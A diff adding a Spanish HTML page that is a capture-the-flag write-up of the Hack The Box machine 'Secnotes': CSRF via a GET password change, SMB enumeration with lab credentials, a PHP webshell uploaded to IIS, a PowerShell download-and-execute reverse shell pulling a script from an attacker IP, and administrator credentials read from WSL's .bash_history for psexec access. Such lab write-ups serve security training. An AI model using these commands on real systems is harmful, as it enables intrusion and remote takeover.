@@ -1,0 +1,145 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>RuyzTz7 | Secnotes HTB</title>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell writeup-detail-shell">
+      <a class="back-link" href="/writeups/windows.html">~/writeups/windows</a>
+
+      <section class="writeup-detail-hero">
+        <img src="/writeups/assets/secnotes/pasted-20260319001102.png" alt="Secnotes HTB" />
+        <div>
+          <p class="eyebrow">HTB / machines / Windows</p>
+          <h1>Secnotes</h1>
+          <div class="tag-list" aria-label="Tags">
+            <span>ubuntu</span>
+            <span>subsistema</span>
+            <span>linux</span>
+            <span>microsoft_iis</span>
+          </div>
+        </div>
+      </section>
+
+      <article class="writeup-article">
+        <section class="writeup-section">
+          <h2>Índice</h2>
+          <ul>
+            <li><code>Enumeración</code>: Aplicación de notas vulnerable a XSS/CSRF y cambio de contraseña vía GET</li>
+            <li><code>Explotación</code>: Abuso del formulario de contacto para cambiar la contraseña de Tyler</li>
+            <li><code>Movimiento lateral</code>: Credenciales SMB permiten subir webshell al IIS del puerto 8808</li>
+            <li><code>Escalada de Privilegios</code>: Subsistema Linux expone credenciales de Administrator en <code>.bash_history</code></li>
+          </ul>
+        </section>
+        <section class="writeup-section">
+          <h2>Enumeración</h2>
+          <img class="writeup-image" src="/writeups/assets/secnotes/pasted-20260319001047.png" alt="Secnotes HTB" />
+          <div class="code-card">
+            <h3>Comandos</h3>
+            <pre><code># Panel Web: Crear usuario alvaro:alvaro123 y iniciar sesión</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/secnotes/pasted-20260319002529.png" alt="Secnotes HTB" />
+          <div class="code-card">
+            <h3>Comandos</h3>
+            <pre><code># Aspecto Web: Interceptamos petición del change password</code></pre>
+          </div>
+          <p>&lt;div style="display:flex; gap:20px;"&gt;</p>
+          <p>&lt;img src="Pasted image 20260319002613.png" width="300"&gt;</p>
+          <p>&lt;img src="Pasted image 20260319002629.png" width="200"&gt;</p>
+          <p>&lt;/div&gt;</p>
+          <img class="writeup-image" src="/writeups/assets/secnotes/pasted-20260319002436.png" alt="Secnotes HTB" />
+          <div class="code-card">
+            <h3>Comandos</h3>
+            <pre><code># Burpsuite: Cambiamos el método y vemos que funciona</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/secnotes/pasted-20260319002410.png" alt="Secnotes HTB" />
+          <div class="code-card">
+            <h3>Comandos</h3>
+            <pre><code># Contact Panel: Envíar GET para que tyler se lo crea y pinche</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/secnotes/pasted-20260319005023.png" alt="Secnotes HTB" />
+          <div class="code-card">
+            <h3>Comandos</h3>
+            <pre><code># Panel Login: Nos loguemoas como Tyler y vemos credenciales
+# Contraseña: 92g!mA8BGjOirkL%OG*&amp;</code></pre>
+          </div>
+          <p>&lt;div style="display:flex; gap:20px;"&gt;</p>
+          <p>&lt;img src="Pasted image 20260319005738.png" width="150"&gt;</p>
+          <p>&lt;img src="Pasted image 20260319004915.png" width="400"&gt;</p>
+          <p>&lt;/div&gt;</p>
+          <div class="code-card">
+            <h3>SMB enumerar shares</h3>
+            <pre><code>nxc SMB secnotes -u 'tyler' -p '92g!mA8BGjOirkL%OG*&amp;' --shares</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/secnotes/pasted-20260319010119.png" alt="Secnotes HTB" />
+          <div class="code-card">
+            <h3>Conectarnos a new-site y subir RCE</h3>
+            <pre><code># new-site está vinculado al IIS del puerto 8808 de la máquina
+smbclient //secnotes/new-site/ -U tyler
+# Subir RCE (txt de prueba, aspx, asp) pero el que funciona es php
+put /usr/share/davtest/backdoors/php_cmd.php
+# URL: http://secnotes:8808/php_cmd.php?cmd=ipconfig</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/secnotes/pasted-20260319011706.png" alt="Secnotes HTB" />
+          <div class="code-card">
+            <h3>Reverse shell</h3>
+            <pre><code># Kali
+penelope -p 443
+# URL: http://secnotes:8808/php_cmd.php?cmd=PowerShell IEX (New-Object Net.WebClient).DownloadString('http://10.10.16.69/Invoke-PowerShellTcp.ps1')</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/secnotes/pasted-20260319012608.png" alt="Secnotes HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Escalada de Privilegios: Subsistema Linux que en la .bash_history de root expone credenciales de administrator</h2>
+          <div class="code-card">
+            <h3>Enumerar raíz de Tyler</h3>
+            <pre><code>tree /f /a
+# Vemos en Tyler un link que ejcuta una bash en dos posibles rutas</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/secnotes/pasted-20260319022739.png" alt="Secnotes HTB" />
+          <img class="writeup-image" src="/writeups/assets/secnotes/pasted-20260319122650.png" alt="Secnotes HTB" />
+          <div class="code-card">
+            <h3>Enumerar raíz del sistema</h3>
+            <pre><code>dir
+# Vemos Ubuntu.zip</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/secnotes/pasted-20260319122600.png" alt="Secnotes HTB" />
+          <div class="code-card">
+            <h3>Buscar bash.exe y ejecutar la ruta absoluta para conseguir bash</h3>
+            <pre><code>where /R c:\ bash.exe
+# Bash -&gt; c:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.17134.1_none_251beae725bc7de5\bash.exe</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/secnotes/pasted-20260319122736.png" alt="Secnotes HTB" />
+          <img class="writeup-image" src="/writeups/assets/secnotes/pasted-20260319122811.png" alt="Secnotes HTB" />
+          <div class="code-card">
+            <h3>Enumerar Linux</h3>
+            <pre><code>cd /root
+ls -a
+cat .bash_history
+# Credenciales -&gt; administrator:u6!4ZwgwOM#^OBf#Nwnh</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/secnotes/pasted-20260319123505.png" alt="Secnotes HTB" />
+          <div class="code-card">
+            <h3>Acceso PSEXEC</h3>
+            <pre><code>impacket-psexec administrator@secnotes
+# Credenciales -&gt; administrator:u6!4ZwgwOM#^OBf#Nwnh</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/secnotes/pasted-20260319123704.png" alt="Secnotes HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Tags</h2>
+          <div class="tag-list">
+            <span>ubuntu</span>
+            <span>subsistema</span>
+            <span>linux</span>
+            <span>microsoft_iis</span>
+          </div>
+        </section>
+      </article>
+    </main>
+  </body>
+</html>
